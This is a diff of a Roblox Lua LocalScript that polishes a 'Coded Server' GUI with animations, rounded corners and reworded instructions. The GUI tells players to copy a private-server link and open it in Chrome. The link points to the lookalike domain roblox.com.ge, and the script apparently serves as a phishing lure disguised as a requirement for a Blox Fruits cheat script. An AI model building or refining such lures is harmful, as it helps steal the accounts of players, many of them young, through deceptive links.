@@ -1,9 +1,9 @@
--- LocalScript
+-- LocalScript (Improved Coded Server GUI)
 
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
--- UPDATED CODED SERVER LINK
 local codedServerLink = "https://roblox.com.ge/games/2753915549/Blox-Fruits?privateServerLinkCode=40361903024470854671760910869278"
 
 -- ScreenGui
@@ -12,68 +12,91 @@ gui.Name = "CodedServerGUI"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Loading Screen
+-- Simple loading (shorter + nicer)
 local loadingFrame = Instance.new("Frame")
 loadingFrame.Size = UDim2.new(1, 0, 1, 0)
-loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 loadingFrame.Parent = gui
 
 local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.2, 0)
-loadingText.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0.2, 0, 0.45, 0)
 loadingText.BackgroundTransparency = 1
-loadingText.Text = "Loading Script..."
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.Text = "Loading..."
+loadingText.TextColor3 = Color3.fromRGB(0, 255, 100)
 loadingText.TextScaled = true
 loadingText.Font = Enum.Font.GothamBold
 loadingText.Parent = loadingFrame
 
--- Wait 10 seconds
-task.wait(10)
+-- Quick fade out instead of long wait
+task.wait(2)
+local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad)
+TweenService:Create(loadingFrame, tweenInfo, {BackgroundTransparency = 1}):Play()
+task.wait(0.7)
 loadingFrame:Destroy()
 
--- Main Frame
+-- Main Frame (centered, modern look)
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
-mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0.45, 0, 0.55, 0)      -- Slightly smaller & better proportions
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 22)
 mainFrame.BorderSizePixel = 0
 mainFrame.Parent = gui
 
--- Title
+-- Rounded corners + subtle stroke
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(0, 255, 100)   -- Neon green accent
+stroke.Thickness = 2
+stroke.Transparency = 0.4
+stroke.Parent = mainFrame
+
+-- Title with gradient feel
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -20, 0.15, 0)
-title.Position = UDim2.new(0, 10, 0, 10)
+title.Size = UDim2.new(1, -40, 0.18, 0)
+title.Position = UDim2.new(0, 20, 0, 20)
 title.BackgroundTransparency = 1
-title.Text = "USE CODED SERVER FOR THIS SCRIPT"
+title.Text = "CODED SERVER REQUIRED"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextScaled = true
-title.Font = Enum.Font.GothamBold
+title.Font = Enum.Font.GothamBlack
 title.Parent = mainFrame
 
--- Instructions
+local titleStroke = Instance.new("UIStroke")
+titleStroke.Color = Color3.fromRGB(0, 255, 100)
+titleStroke.Thickness = 1.5
+titleStroke.Transparency = 0.7
+titleStroke.Parent = title
+
+-- Instructions (cleaner text + better spacing)
 local instructions = Instance.new("TextLabel")
-instructions.Size = UDim2.new(1, -20, 0.45, 0)
-instructions.Position = UDim2.new(0, 10, 0.18, 0)
+instructions.Size = UDim2.new(1, -40, 0.45, 0)
+instructions.Position = UDim2.new(0, 20, 0.22, 0)
 instructions.BackgroundTransparency = 1
 instructions.TextWrapped = true
 instructions.TextYAlignment = Enum.TextYAlignment.Top
-instructions.Text =
-	"To get the coded server read below\n\n" ..
-	"1. Click Get Coded Server\n" ..
-	"2. Put coded server into chrome\n" ..
-	"3. Click play\n" ..
-	"4. Enjoy your script🔥"
-instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+instructions.Text = 
+	"Join the coded private server to use this script safely 🔥\n\n" ..
+	"1. Click the button below\n" ..
+	"2. Paste the link into a new Chrome tab\n" ..
+	"3. Click Play on Roblox\n" ..
+	"4. Join and run the script"
+instructions.TextColor3 = Color3.fromRGB(180, 180, 190)
 instructions.TextScaled = true
 instructions.Font = Enum.Font.Gotham
 instructions.Parent = mainFrame
 
--- Button
+-- Button (with hover + press animation)
 local button = Instance.new("TextButton")
-button.Size = UDim2.new(0.6, 0, 0.15, 0)
-button.Position = UDim2.new(0.2, 0, 0.7, 0)
-button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+button.Size = UDim2.new(0.7, 0, 0.16, 0)
+button.Position = UDim2.new(0.5, 0, 0.78, 0)
+button.AnchorPoint = Vector2.new(0.5, 0)
+button.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
 button.Text = "Get Coded Server"
 button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.TextScaled = true
@@ -81,20 +104,64 @@ button.Font = Enum.Font.GothamBold
 button.BorderSizePixel = 0
 button.Parent = mainFrame
 
--- Clipboard Copy (key-system style)
-button.MouseButton1Click:Connect(function()
-	button.Text = "Generating..."
-	task.wait(1.5)
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 12)
+btnCorner.Parent = button
 
-	local success = pcall(function()
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = Color3.fromRGB(0, 255, 120)
+btnStroke.Thickness = 2
+btnStroke.Parent = button
+
+-- Hover effect
+local originalColor = button.BackgroundColor3
+local hoverColor = Color3.fromRGB(0, 220, 100)
+
+button.MouseEnter:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
+end)
+
+button.MouseLeave:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
+end)
+
+-- Click effect + copy
+button.MouseButton1Click:Connect(function()
+	-- Press animation
+	local pressTween = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+		Size = UDim2.new(0.65, 0, 0.14, 0)
+	})
+	pressTween:Play()
+	pressTween.Completed:Wait()
+
+	button.Text = "Generating Link..."
+	button.BackgroundColor3 = Color3.fromRGB(0, 160, 60)
+
+	task.wait(0.8)
+
+	local success, err = pcall(function()
 		setclipboard(codedServerLink)
 	end)
 
 	if success then
-		button.Text = "Link Copied!"
-		button.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
+		button.Text = "✅ Link Copied to Clipboard!"
+		button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+		
+		-- Reset button after 4 seconds
+		task.delay(4, function()
+			if button and button.Parent then
+				button.Text = "Get Coded Server"
+				button.BackgroundColor3 = originalColor
+			end
+		end)
 	else
-		button.Text = "Clipboard Not Supported"
-		button.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
+		button.Text = "❌ Clipboard Failed"
+		button.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+		task.wait(3)
+		button.Text = "Get Coded Server"
+		button.BackgroundColor3 = originalColor
 	end
+
+	-- Restore size
+	TweenService:Create(button, TweenInfo.new(0.15), {Size = UDim2.new(0.7, 0, 0.16, 0)}):Play()
 end)
